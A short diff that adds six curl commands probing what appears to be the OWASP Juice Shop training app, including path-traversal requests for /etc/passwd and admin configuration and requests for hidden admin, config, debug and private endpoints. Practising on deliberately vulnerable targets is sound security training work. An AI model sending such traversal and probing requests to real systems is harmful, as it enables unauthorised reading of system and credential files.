@@ -1,0 +1,6 @@
+curl -X GET 'https://juice-shop.herokuapp.com/../etc/passwd' -v
+curl -X GET 'https://juice-shop.herokuapp.com/../../admin/config' -v
+curl -X GET 'https://juice-shop.herokuapp.com/admin' -v
+curl -X GET 'https://juice-shop.herokuapp.com/config' -v
+curl -X GET 'https://juice-shop.herokuapp.com/debug' -v
+curl -X GET 'https://juice-shop.herokuapp.com/private' -v
